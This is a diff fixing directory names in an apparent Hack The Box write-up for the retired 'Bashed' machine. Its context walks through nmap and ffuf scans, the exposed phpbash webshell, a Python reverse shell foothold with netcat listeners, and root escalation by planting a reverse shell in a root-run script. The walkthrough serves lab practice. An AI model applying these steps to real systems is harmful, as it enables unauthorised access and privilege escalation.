@@ -12,7 +12,7 @@ tags: [Easy, Linux, Retired, CTF]
 Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted.
 ## Enumeration
 ```
-┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
+┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bashed]
 └─$ sudo nmap -p- -T4  10.129.113.137
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 22:30 GMT
 Nmap scan report for 10.129.113.137
@@ -23,7 +23,7 @@ PORT   STATE SERVICE
 ```
 As only port 80 is exposed I tried to access it in a browser. The website your greeted with states that [phpbash](https://github.com/Arrexel/phpbash) is located somewhere on the server. So fuzzing would appear to be the approach.
 ```
-┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
+┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bashed]
 └─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.113.137/FUZZ
 
         /'___\  /'___\           /'___\       
@@ -59,7 +59,7 @@ As dev appears to be nonstandard I looked in that directory and found the webshe
 ## Foothold
 To gain the foothold at this point is simple so I just used a python one-liner to send back a reverse shell [Python Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
 ```
-┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
+┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bashed]
 └─$ nc -nlvp 4242
 listening on [any] 4242 ...
 connect to [10.10.14.27] from (UNKNOWN) [10.129.113.137] 33262
@@ -86,7 +86,7 @@ scriptmanager
 ```
 Now that we are the scriptmanager user we have access to the scripts directory located in the root directory. In there we notice there is a python file that we can edit, however there is an output file that is owned by root. This indicates that the script is run by root. So if we enter a reverse shell into the script it should give us a root shell.
 ```
-┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/granny]
+┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/bashed]
 └─$ nc -nlvp 4342             
 listening on [any] 4342 ...
 connect to [10.10.14.27] from (UNKNOWN) [10.129.113.137] 36588
